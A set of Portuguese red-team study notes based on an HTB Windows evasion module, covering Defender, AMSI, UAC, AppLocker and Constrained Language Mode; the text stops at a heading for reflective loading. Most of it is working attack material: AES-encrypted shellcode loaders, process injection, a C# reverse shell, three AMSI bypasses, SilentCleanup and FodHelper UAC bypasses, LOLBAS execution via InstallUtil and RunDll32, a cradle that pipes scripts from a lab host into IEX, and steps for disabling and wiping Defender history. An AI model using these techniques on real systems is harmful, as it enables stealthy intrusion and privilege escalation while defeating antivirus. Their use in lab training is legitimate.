---
title: "Windows Evasion (HTB)"
---

# Técnicas de Evasão Windows (HTB)

> Baseado no módulo HTB "Introduction to Windows Evasion Techniques" (AD Penetration Tester Path 2024).
> Este documento cobre técnicas específicas ensinadas no módulo HTB e NÃO duplica conteúdo
> já coberto em `03_amsi_bypass.md` ou `04_applocker_bypass.md` além do necessário para contexto.

---

## Defender Como Linha de Base de Engajamento

Evadir antivírus é frequentemente descrito como um jogo de gato e rato: atacantes desenvolvem novos
vetores e os provedores de AV desenvolvem assinaturas para detectá-los. O Microsoft Defender
Antivirus é o AV mais relevante em engajamentos porque vem pré-instalado em **toda** cópia do
Windows desde o Windows 8, e é ativamente mantido com atualizações de assinatura frequentes.

Para um operador de red team, entender o Defender é fundamental porque:

- Ferramentas de pós-exploração comuns (Meterpreter, Rubeus, Seatbelt, Mimikatz) são **todas**
  detectadas por padrão — tanto por análise estática quanto comportamental.
- Bypasses simples (ex: apenas XOR no shellcode) não são mais suficientes. O Defender combina
  análise de disco, análise em memória, e behavioral detection.
- O Constrained Language Mode (CLM) do PowerShell é ativado automaticamente quando AppLocker
  está configurado, limitando drasticamente o que pode ser executado.
- UAC cria um segundo plano de bloqueio: mesmo tendo credenciais de admin, o processo pode
  rodar em integridade média, impedindo ações que requerem integridade alta.

A abordagem do módulo HTB é prática: construir payloads C# customizados do zero, entender
exatamente o que o Defender detecta usando ThreatCheck, e escalar gradualmente as técnicas
até obter execução completa contornando proteções em camadas.

---

## Análise Estática e Comportamental: Dois Planos Independentes de Detecção

### Dois Mecanismos Principais de Detecção do Defender

O Microsoft Defender Antivirus opera com dois grandes modos de detecção:

#### 1. Análise Estática (Static Analysis)

Detecta malware **em disco** através de:
- **Hashes de arquivo** — Um arquivo com SHA256 `ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa`
  é detectado diretamente como WannaCry, sem precisar executar.
- **Padrões de bytes e strings** — A engine verifica sequências de bytes específicas dentro do
  arquivo. Ferramentas como **ThreatCheck** identificam o offset exato dos bytes problemáticos.
- **Regras YARA internas** — O banco de assinaturas do Defender não é público, mas pode ser
  investigado indiretamente com a ferramenta `ExpandDefenderSig.ps1`.

A análise estática é acionada quando:
- Um arquivo é criado em disco
- Um arquivo é copiado (mesmo entre pastas)
- Uma pasta que não está nas exclusões do Defender contém o arquivo

#### 2. Análise Dinâmica (Dynamic Analysis / Behavioral Analysis)

Detecta malware **em execução** através de:
- **Memory scans** — Acionados por eventos como criação de novo processo, operações suspeitas,
  ou detecção de comportamento anômalo. O shellcode descriptografado em memória pode ser detectado
  mesmo que o arquivo em disco passe na análise estática.
- **Behavioral detection** — O processo é monitorado. Se `NotMalware.exe` abre uma shell
  (`cmd.exe`), o Defender detecta isso como comportamento suspeito e mata o processo.

**Exemplo prático visto no módulo:** Após contornar a análise estática com criptografia AES
do shellcode, ao executar o binário e abrir uma shell dentro do Meterpreter, o processo foi
detectado e morto pelo Defender. Isso demonstra que **estático e comportamental são camadas
separadas** — passar em uma não garante passar na outra.

### Como o ThreatCheck Funciona

ThreatCheck divide o binário em chunks e faz o Defender escanear cada chunk isoladamente,
fazendo uma busca binária para encontrar o offset exato dos bytes que triggeram a detecção.
Isso permite localizar com precisão qual string, sequência de bytes, ou GUID está causando
a detecção, sem precisar adivinhar.

```powershell
# Uso básico
ThreatCheck.exe -f .\NotMalware.exe

# Saída indica:
# [+] Target file size: 5632 bytes
# [+] Analyzing...
# [!] Identified end of bad bytes at offset 0xD63
```

### Níveis de Integridade do Windows (UAC)

Todo objeto segurável no Windows recebe um **integrity level**:
- **Low** — Processos sandbox (ex: Internet Explorer em Protected Mode)
- **Medium** — Processos padrão de usuário normal
- **High** — Processos com privilégios elevados (requerem UAC prompt)
- **System** — Serviços do sistema

Um processo com integrity level menor **não pode acessar** objetos com integrity level maior.
Bypassar UAC significa elevar de Medium para High sem mostrar o prompt ao usuário.

### PowerShell Constrained Language Mode (CLM)

O PowerShell possui quatro modos de linguagem:

| Modo | Descrição |
|------|-----------|
| `FullLanguage` | Padrão, sem restrições |
| `RestrictedLanguage` | Pode executar comandos mas não blocos de script |
| `ConstrainedLanguage` | Operações que podem ser abusadas por atores maliciosos são restritas |
| `NoLanguage` | Desabilita completamente a linguagem de scripting do PS |

**Quando o AppLocker está configurado em um sistema, o PowerShell é automaticamente colocado
em ConstrainedLanguage mode para todos os usuários** — exceto sessões com High Integrity Level,
que usam FullLanguage.

Em CLM, as seguintes operações são bloqueadas:
- `Add-Type` não pode carregar código C# arbitrário ou Win32 APIs
- Apenas tipos de uma lista restrita de tipos "core" são permitidos
- Reflection limitada — o primeiro AMSI bypass (`[Ref].Assembly.GetType(...)`) falha em CLM
  com "Method invocation is supported only on core types"

Verificar o modo atual:
```powershell
$ExecutionContext.SessionState.LanguageMode
# Retorna: ConstrainedLanguage
```

---

## Na Prática

### Fluxo Geral de Desenvolvimento de Payload

O módulo HTB ensina um fluxo iterativo de desenvolvimento:

```
1. Criar payload base em C# (.NET Framework)
2. Compilar em Release mode, x64
3. Rodar ThreatCheck para identificar bytes problemáticos
4. Modificar código (renomear strings, trocar GUIDs, criptografar)
5. Recompilar e repetir até "No threat found!"
6. Testar com Real-time protection ATIVADA
7. Verificar detecção comportamental abrindo shell/executando comandos
```

### Caso de Estudo: NotMalware (Análise Estática)

O projeto `NotMalware` demonstra o ciclo completo de evasão estática.

**Baseline — shellcode Meterpreter detectado imediatamente:**
```csharp
// Shellcode direto do msfvenom — detectado como Trojan:Win64/Meterpreter.E
byte[] buf = new byte[] { 0xfc, 0x48, 0x83, ... };
IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);
Marshal.Copy(buf, 0, lpStartAddress, buf.Length);
UInt32 lpflOldProtect;
VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);
UInt32 lpThreadId = 0;
IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);
WaitForSingleObject(hThread, 0xffffffff);
```

**Após XOR — ainda detectado** (o Defender possui assinatura para o shellcode XOR'd):
```csharp
// Shellcode XOR'd com 0x5c — ainda detectado pelo Defender
byte[] buf = new byte[] { 0xa0, 0x14, 0xdf, ... };
// Decrypt loop
int i = 0;
while (i < buf.Length) { buf[i] = (byte)(buf[i] ^ 0x5c); i++; }
```

**Após AES — bypass estático bem-sucedido:**
```csharp
// Shellcode gerado com micr0_shell e criptografado com AES via CyberChef
string bufEnc = "<BASE64_AES_ENCRYPTED_SHELLCODE>";

// Decrypt shellcode
Aes aes = Aes.Create();
byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0x0b, 0x25, 0x0d, 0xeb, 0x07,
                              0x91, 0x0d, 0x8c, 0x01, 0xcf, 0xa5, 0x0e, 0x97 };
byte[] iv  = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x86, 0xa1, 0xef, 0x21,
                              0x86, 0x0d, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5 };
ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
byte[] buf;
using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
using (var msPlain   = new System.IO.MemoryStream())
{
    csDecrypt.CopyTo(msPlain);
    buf = msPlain.ToArray();
}
// buf contém shellcode original — alocado e executado normalmente
```

**Importante:** O shellcode do micr0_shell foi usado em vez do Meterpreter porque o
micr0_shell ainda não tinha assinaturas no Defender na época do módulo. Este é o conceito
de **"trocar o payload"** — usar um gerador de shellcode menos conhecido.

### Shellcode Alternativo: micr0_shell

```bash
# Gerar shellcode PIC Null-Free reverse shell via micr0_shell
python.exe .\micr0_shell.py -i [IP] -p 8080 -l csharp
```

micr0_shell gera shellcode para Windows x64 que é até 27 bytes menor que o msfvenom equivalente
e evita NULL bytes. Como não é amplamente usado por atacantes ainda, o Defender não tinha
assinatura para ele no momento do módulo.

### Caso de Estudo: AlsoNotMalware (Process Injection)

Para contornar a detecção comportamental do Meterpreter (que é detectado quando abre uma shell),
o módulo mostra **process injection** via WinAPI usando P/Invoke em C#.

As três APIs chave:

```
VirtualAllocEx  — Aloca memória no espaço de endereços do processo alvo
WriteProcessMemory — Escreve shellcode no espaço alocado
CreateRemoteThread — Executa o shellcode no contexto do processo alvo
```

O projeto `AlsoNotMalware` realiza injection em um processo recém-criado (`CreateProcess`),
inicialmente com permissões `Read/Write`, depois alterando para `Read/Execute` com
`VirtualProtectEx` antes de executar — evitando a alocação direta `RWX` que alguns
produtos de segurança sinalizam.

```csharp
// Estrutura simplificada do AlsoNotMalware
// 1. Definir shellcode (micr0_shell AES-encrypted)
// 2. CreateProcess para spawnar processo alvo
// 3. VirtualAllocEx com Read/Write
// 4. WriteProcessMemory
// 5. VirtualProtectEx para Read/Execute
// 6. CreateRemoteThread

IntPtr hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero, 0,
                                    lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
```

### Ferramenta: RShell (Custom TCP Reverse Shell)

Para demonstrar que ferramentas customizadas não são detectadas comportamentalmente
(porque não têm assinaturas), o módulo cria uma reverse shell TCP em C# que spawna
um processo PowerShell e redireciona stdin/stdout/stderr:

```csharp
// Configuração do processo PowerShell oculto
p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
p.StartInfo.Arguments = "-ep bypass -nologo";
p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardError = true;
p.StartInfo.RedirectStandardInput = true;
p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);
```

**Resultado:** Shell PowerShell interativa obtida sem qualquer detecção pelo Defender,
porque o código não corresponde a nenhuma assinatura conhecida.

---

## AMSI Bypass — Contexto do Módulo HTB

> Detalhes aprofundados do AMSI estão em `03_amsi_bypass.md`. Aqui cobrimos os bypasses
> específicos ensinados no módulo HTB e a relação com carregamento reflexivo.

### Bypass 1: Setting amsiInitFailed (via Reflection)

O primeiro bypass público do AMSI (Matt Graeber, 2016) define o campo `amsiInitFailed` como
`true`, fazendo com que `ScanContent` sempre retorne `AMSI_RESULT_NOT_DETECTED`.

```powershell
# Versão original (detectada pelo Defender):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Versão ofuscada com concatenação de strings (funcional):
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```

**Limitação em CLM:** Este bypass falha em Constrained Language Mode porque `[Ref]` é
um tipo permitido, mas a invocação de método em tipos não-core é bloqueada.

### Bypass 2: Patching amsiScanBuffer

Este bypass carrega `amsi.dll`, obtém o endereço de `AmsiScanBuffer` e sobrescreve o
início da função com um shellcode que retorna `E_FAIL` (0x80004005):

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3)  # mov eax, 0x80004005; ret
$hModule   = [Kernel32]::LoadLibrary("amsi.dll")
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer")
$lpflOldProtect = 0
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null
$marshal = [System.Runtime.InteropServices.Marshal]
$marshal::Copy($patch, 0, $lpAddress, $patch.Length)
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null
```

**Vantagem sobre Bypass 1:** Faz patch na `amsi.dll` em memória, então funciona mesmo
quando `[System.Reflection.Assembly]::Load()` é chamado para carregar assemblies .NET —
o AMSI scan do carregamento também é contornado.

### Bypass 3: Forcing an Error via amsiContext

Corrompe o `amsiContext` alocando um buffer de 4 bytes e setando `amsiSession` para null,
fazendo `AmsiOpenSession` retornar `0x80070057` (E_INVALIDARG), o que aciona
`amsiInitFailed = true` legitimamente:

```powershell
$utils   = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
$context = $utils.GetField('amsi'+'Context','NonPublic,Static');
$session = $utils.GetField('amsi'+'Session','NonPublic,Static');
$marshal = [System.Runtime.InteropServices.Marshal];
$newContext = $marshal::AllocHGlobal(4);
$context.SetValue($null,[IntPtr]$newContext);
$session.SetValue($null,$null);
```

### Impacto do Tipo de Bypass no Carregamento Reflexivo

**Ponto crítico do módulo HTB:** Ao usar carregamento reflexivo de assemblies .NET com
`[System.Reflection.Assembly]::Load()`, o AMSI ainda escaneia o assembly sendo carregado.

- **Bypass 1 (amsiInitFailed):** Desabilita AMSI apenas para a sessão PowerShell atual.
  O Load() da assembly ainda é escaneado e bloqueado.
- **Bypass 2 (patch amsi.dll):** Patcha a DLL em memória, então todos os scans — incluindo
  o Load() — são contornados. **Este é o bypass correto para uso com carregamento reflexivo.**

---

## Modificação de Software Open-Source para Evasão

### Método 1: Quebrar Assinaturas Manualmente (ThreatCheck + Visual Studio)

Processo iterativo para tornar ferramentas conhecidas (como Rubeus) não detectadas:

```
1. Compilar em Release mode
2. ThreatCheck.exe -f .\Rubeus.exe
3. Identificar bytes problemáticos e localizá-los no código
4. Renomear classes/variáveis que triggeram detecção
5. Recompilar e repetir
```

**Exemplo com Rubeus:**
- 1ª tentativa: Assinatura em variáveis `ticket` — renomear todas instâncias
- 2ª tentativa: Nova assinatura na string `DiffieHellmanKey` — renomear a classe para `DHKey`
- 3ª tentativa: Assinatura no GUID do projeto (TypeLib GUID) e metadata de assembly

Gerar novo GUID para substituir o GUID original do Rubeus:
```powershell
[GUID]::NewGUID()
# Exemplo: 0fb06558-5168-4398-a791-fa485f4f7325
```

O novo GUID é atualizado em: `Project > Rubeus Properties > Application > Assembly Properties > GUID`

**Por que o GUID importa:** Regras YARA como a do FireEye para Rubeus verificam apenas
dois fatores: que o arquivo começa com bytes `4D 5A` (DOS MZ header) e que o TypeLib GUID
do projeto público do Rubeus está presente. Trocar o GUID quebra essa regra.

### Método 2: Carregamento Reflexivo de Assemblies em PowerShell

Permite executar ferramentas .NET completamente **em memória**, sem escrever arquivos em disco,
combinado com AMSI bypass:

```powershell
function Invoke-Seatbelt {
    [CmdletBinding()]
    Param (
        [String]
        $args = " "
    )

    # Assembly compilado, comprimido com GZIP e codificado em Base64
    $gzipB64 = "<SNIP_BASE64_GZIP_ENCODED_SEATBELT>";

    # Decodificar Base64
    $gzipBytes = [Convert]::FromBase64String($gzipB64)

    # Descomprimir GZIP
    $gzipMemoryStream  = New-Object IO.MemoryStream(, $gzipBytes)
    $gzipStream        = New-Object System.IO.Compression.GzipStream($gzipMemoryStream, [IO.Compression.CompressionMode]::Decompress)
    $seatbeltMemoryStream = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($seatbeltMemoryStream)

    # Carregar assembly reflexivamente
    $seatbeltArray = $seatbeltMemoryStream.ToArray()
    $seatbelt = [System.Reflection.Assembly]::Load($seatbeltArray)

    # Redirecionar STDOUT para capturar output
    $OldConsoleOut = [Console]::Out
    $StringWriter  = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    # Invocar Main com argumentos
    [Seatbelt.Program]::Main($args.Split(" "))

    # Restaurar STDOUT
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
```

**Preparação do assembly:**
```powershell
# Preparar Seatbelt.exe para carregamento reflexivo:
# 1. Mudar Main() de private para public em Program.cs
# 2. Compilar em Release mode
# 3. Comprimir e codificar via CyberChef: GZIP -> Base64
# 4. Colar o resultado em $gzipB64
```

**Uso:**
```powershell
# Aplicar AMSI bypass que patcha amsi.dll (Bypass 2) primeiro
$wc = New-Object Net.WebClient
$wc.DownloadString('http://10.10.14.104/Amsi-Bypass-2.ps1') | IEX
$wc.DownloadString('http://10.10.14.104/Invoke-Seatbelt.ps1') | IEX
Invoke-Seatbelt LSASettings
```

---

## UAC Bypass

### Conceito: Elevação de Integridade

UAC bypass do ponto de vista do atacante significa elevar de **Medium** para **High** integrity
quando se tem controle de uma conta com grupo Administrators, mas o token ainda é o token
filtrado (medium integrity).

### Bypass 1: DiskCleanup SilentCleanup Scheduled Task Hijack

Descoberto por James Forshaw (Google Project Zero) em 2017. A tarefa agendada `SilentCleanup`
(em `\Microsoft\Windows\DiskCleanup`) tem a opção "Run with highest privileges" ativada e
pode ser iniciada por qualquer processo com Medium Integrity Level.

**Vetor de exploração:**
A tarefa executa `%windir%\system32\cleanmgr.exe`. Como `%windir%` é uma variável de ambiente
no registro do usuário (`HKCU:\Environment`), ela pode ser sobrescrita:

```powershell
# Colocar RShell.exe em C:\Windows\Tasks\ (diretório que usuários podem escrever)
# e hijack o %windir% com um comando que executa RShell e ignora o restante

Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" `
    -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8080 & REM " -Force

# REM é um comentário CMD — tudo depois é ignorado
# SilentCleanup vai executar: cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8080 & REM \system32\cleanmgr.exe...

Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"
```

**Limpeza após bypass:**
```powershell
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
```

**Resultado:** Shell obtida com `Mandatory Label\High Mandatory Level`.

### Bypass 2: FodHelper Execution Hijack

Descoberto em 2017. `C:\Windows\System32\fodhelper.exe` possui o atributo `autoElevate=true`
(verificável com `sigcheck.exe -m`), o que faz ele escalar automaticamente de Medium para
High integrity quando executado.

Quando FodHelper é executado, tenta ler `HKCU\Software\Classes\ms-settings\Shell\Open\Command`.
Se não existe em HKCU, consulta HKCR. Como o atacante controla HKCU, pode injetar o comando:

```powershell
# Criar as chaves necessárias em HKCU
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(default)" -Value "C:\Windows\Tasks\RShell <IP> 8080" -Force

# Executar FodHelper — ele lê a chave e executa nosso comando com High Integrity
C:\Windows\System32\fodhelper.exe
```

**Limpeza:**
```powershell
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

**Detecção pelo Defender:** A versão clássica (criando a chave `DelegateExecute` via PowerShell
e depois executando fodhelper do PowerShell) é detectada como `Behavior:Win32/UACBypassExp.TIgen`.
A mitigação é usar um método de execução alternativo (ex: `cmd.exe /c fodhelper.exe`).

**Referência para outros vetores:** WinPwnage contém 15 implementações Python de UAC bypasses.

---

## AppLocker e LOLBAS

> Mecanismo interno do AppLocker está coberto em `04_applocker_bypass.md`.
> Aqui focamos nos vetores LOLBAS específicos ensinados no módulo HTB.

### Enumerando AppLocker

```powershell
# Ver política efetiva completa
Get-AppLockerPolicy -Effective -Xml

# Testar se um arquivo específico seria bloqueado para um usuário
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\SysinternalsSuite\procexp.exe -User max
```

### Explorando o Ruleset Padrão

O ruleset padrão do AppLocker para executáveis permite execução de `%WINDIR%\*`.
Diretórios dentro de `%WINDIR%` onde usuários padrão podem escrever E executar:

```powershell
# Script para encontrar diretórios graváveis e executáveis dentro do WINDIR
Get-ChildItem $env:windir -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    $dir = $_.;
    (Get-Acl $dir.FullName).Access | ForEach-Object {
        if ($_.AccessControlType -eq "Allow") {
            if ($_.IdentityReference.Value -eq "NT AUTHORITY\Authenticated Users" `
            -or $_.IdentityReference.Value -eq "BUILTIN\Users") {
                if (($_.FileSystemRights -like "*Write*" -or $_.FileSystemRights -like "*Create*") `
                -and $_.FileSystemRights -like "*Execute*") {
                    Write-Host ($dir.FullName + ": " + $_.IdentityReference.Value + " (" + $_.FileSystemRights + ")")
                }
            }
        }
    };
}
```

**Diretórios típicos encontrados:**
```
C:\Windows\Tasks:           NT AUTHORITY\Authenticated Users (CreateFiles, ReadAndExecute, Synchronize)
C:\Windows\Temp:            BUILTIN\Users (CreateFiles, AppendData, ExecuteFile, Synchronize)
C:\Windows\tracing:         BUILTIN\Users (Write, ReadAndExecute, Synchronize)
C:\Windows\System32\spool\drivers\color: BUILTIN\Users (CreateFiles, ReadAndExecute, Synchronize)
```

Qualquer um desses diretórios pode ser usado para colocar e executar binários burlando AppLocker.

### LOLBAS: InstallUtil.exe

**O que é:** Utilitário legítimo da Microsoft para instalar/desinstalar server resources via
.NET. Está localizado em `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`.
Por estar em `C:\Windows`, passa pelo ruleset padrão do AppLocker.

**Como explorar:** O InstallUtil executa o método `Uninstall` de uma classe que herda de
`System.Configuration.Install.Installer`:

```csharp
using System;
using System.Configuration.Install;

public class NotMalware_IU
{
    public static void Main(string[] args) { }
}

[System.ComponentModel.RunInstaller(true)]
public class A : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // CÓDIGO EXECUTADO AQUI
        // Pode incluir: alocação de shellcode, reverse shell, etc.
        // <SNIP — mesma lógica de NotMalware com shellcode AES>
    }
}
```

**Compilação:** Console App (.NET Framework), target x64, Release mode.

**Execução:**
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Tools\NotMalware_IU\NotMalware_IU\bin\x64\Release\NotMalware_IU.exe
```

**Resultado:** Reverse shell obtida, bypassando AppLocker **e** Real-time protection.

### LOLBAS: RunDll32.exe

**O que é:** Binário padrão do Windows para carregar e executar DLLs.
Localizado em `C:\Windows\System32\RunDll32.exe`.

**Por que funciona:** Como InstallUtil, RunDll32 é um binário legítimo da Microsoft em `C:\Windows`,
então passa pelo AppLocker por padrão.

**Preparação — exportar método de DLL .NET:**

Por padrão, código gerenciado (.NET) não pode exportar funções DLL. O pacote NuGet `DllExport`
(github.com/3F/DllExport) resolve isso:

```csharp
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using RGiesecke.DllExport;  // via DllExport NuGet

namespace RShell_D
{
    internal class Program
    {
        private static StreamWriter streamWriter;

        [DllExport("DllMain")]   // marca o método como exportado
        public static void DllMain(string[] args)
        {
            // Lógica de reverse shell TCP
            // (mesma do RShell, adaptada para DLL)
        }
    }
}
```

**Execução:**
```cmd
C:\Windows\System32\RunDll32.exe C:\Tools\RShell_D\RShell_D\bin\Release\x86\RShell_D.dll,DllMain
```

**Resultado:** Shell PowerShell interativa, bypassando AppLocker e Real-time protection.

---

## PowerShell Constrained Language Mode — Bypass

### Estratégia: Elevar Integrity Level Primeiro

O CLM só é imposto para sessões sem High Integrity Level. Portanto, o bypass do CLM
está diretamente ligado ao bypass do UAC:

```
AppLocker ativado → CLM ativado (Medium Integrity)
UAC Bypass → High Integrity → FullLanguage mode
```

Fluxo prático:
```
1. Verificar CLM: $ExecutionContext.SessionState.LanguageMode
2. Aplicar UAC bypass (SilentCleanup ou FodHelper)
3. Nova sessão tem High Integrity → FullLanguage
4. Agora pode usar AMSI bypass, carregar assemblies reflexivamente, etc.
```

### Bypass Alternativo: Usar LOLBINs que Não Passam pelo CLM

InstallUtil e RunDll32, quando executados, não herdam o CLM da sessão PowerShell atual.
O código C# executado por eles roda como processo separado com suas próprias permissões.

---

## Exemplos de Código / Comandos

### Comandos PowerShell do Defender (Diagnóstico/Investigação)

```powershell
# Status geral do Defender
Get-MpComputerStatus

# Verificar campos importantes
Get-MpComputerStatus | Select-Object AntivirusSignatureLastUpdated, IsTamperProtected, IsVirtualMachine, RealTimeProtectionEnabled

# Ver histórico de ameaças detectadas
Get-MpThreat

# Detalhes de detecção específica por ThreatID
Get-MpThreatDetection -ThreatID 2147894794

# Desabilitar real-time protection (requer admin)
Set-MpPreference -DisableRealTimeMonitoring $true

# Limpar histórico de proteção
# Deletar todos arquivos em:
# C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service
```

### Usando ThreatCheck

```powershell
# Scan de arquivo local
ThreatCheck.exe -f .\NotMalware.exe

# Scan de URL
ThreatCheck.exe -u http://10.10.14.104/payload.exe
```

### Verificar Modo de Linguagem do PowerShell

```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = sem restrições
# ConstrainedLanguage = AppLocker ativo
```

### Enumeração de AppLocker

```powershell
# Política completa em XML
Get-AppLockerPolicy -Effective -Xml

# Testar arquivo para usuário específico
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\path\to\file.exe -User max

# Encontrar diretórios graváveis dentro do Windows
# (script completo na seção AppLocker acima)
```

### UAC Bypass — SilentCleanup

```powershell
# Colocar payload em C:\Windows\Tasks\
# Depois:
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" `
    -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8080 & REM " -Force
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"

# Limpeza
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
```

### UAC Bypass — FodHelper

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(default)" -Value "C:\Windows\Tasks\RShell <IP> 8080" -Force
C:\Windows\System32\fodhelper.exe

# Limpeza
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### LOLBAS: InstallUtil

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe ^
    /logfile= /LogToConsole=false /U C:\Tools\NotMalware_IU.exe
```

### LOLBAS: RunDll32

```cmd
C:\Windows\System32\RunDll32.exe C:\Tools\RShell_D.dll,DllMain
```

### Gerar GUID para obfuscação de assembly

```powershell
[GUID]::NewGUID()
# Ex: 0fb06558-5168-4398-a791-fa485f4f7325
```

### Verificar atributo autoElevate de binário

```powershell
C:\Tools\SysinternalsSuite\sigcheck.exe -m C:\Windows\System32\fodhelper.exe | findstr autoElevate
# <autoElevate>true</autoElevate>
```

---

## Detecção e OPSEC

### O Que o Defender Monitora

| Ação | Mecanismo de Detecção | Nível de Risco |
|------|-----------------------|----------------|
| Arquivo com hash conhecido em disco | Static — hash scan | Alto |
| Strings/bytes conhecidos em binário | Static — byte pattern | Alto |
| TypeLib GUID de ferramenta conhecida | Static — YARA metadata | Médio |
| Shellcode em memória (não criptografado) | Dynamic — memory scan | Alto |
| Processo abrindo shell inesperadamente | Behavioral | Alto |
| Criação de chave HKCU\ms-settings (FodHelper) | Behavioral | Médio |
| Execução de InstallUtil/RunDll32 com DLL suspeita | Behavioral/Heuristic | Médio |
| Modificação de %windir% em HKCU | Behavioral (UAC bypass) | Médio |

### Mitigações de Detecção por Tipo de Payload

**Para análise estática:**
- Criptografar shellcode com AES (não apenas XOR)
- Usar gerador de shellcode alternativo (micr0_shell, custom) em vez de msfvenom
- Renomear strings identificadoras, classes, namespaces no código fonte
- Trocar TypeLib GUID do projeto
- Remover informações de versão/copyright do assembly metadata
- Usar ThreatCheck iterativamente até "No threat found"

**Para análise comportamental:**
- Não usar Meterpreter diretamente — preferir shellcode custom ou C# puro
- Evitar spawnar `cmd.exe` ou `powershell.exe` a partir do payload principal
- Usar process injection para executar shellcode dentro de processo legítimo (ex: notepad.exe)
- Preferir reverse shells TCP em C# customizadas que não correspondem a assinaturas conhecidas

**Para UAC bypass:**
- Não criar chave `DelegateExecute` via PowerShell antes de executar fodhelper — use cmd.exe
- Limpar artefatos (registry keys, environment variables) imediatamente após elevação
- Considerar DiskCleanup como alternativa ao FodHelper (menos signatures)

**Para AppLocker/CLM:**
- Priorizar técnicas de High Integrity antes de tentar CLM bypass
- Usar LOLBINs (InstallUtil, RunDll32) que executam fora do contexto CLM
- Escrever payloads em C:\Windows\Tasks\ ou outros diretórios graváveis dentro do WINDIR

### Artefatos Gerados por Cada Técnica

**UAC Bypass — SilentCleanup:**
- Chave de registro modificada: `HKCU:\Environment\windir`
- Evento no Task Scheduler log: execução da task SilentCleanup com timing anormal

**UAC Bypass — FodHelper:**
- Chave de registro criada: `HKCU\Software\Classes\ms-settings\Shell\Open\command`
- Evento: processo `fodhelper.exe` spawnou processo não-standard

**AMSI Bypass Patch:**
- Modificação em memória de `amsi.dll` no processo PowerShell
- Detecção possível por EDR que monitora integridade de módulos carregados

**Process Injection:**
- Chamadas sequenciais de `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`
  visíveis para ferramentas de monitoramento de processo
- Sysmon Event ID 8 (CreateRemoteThread)

**Carregamento Reflexivo:**
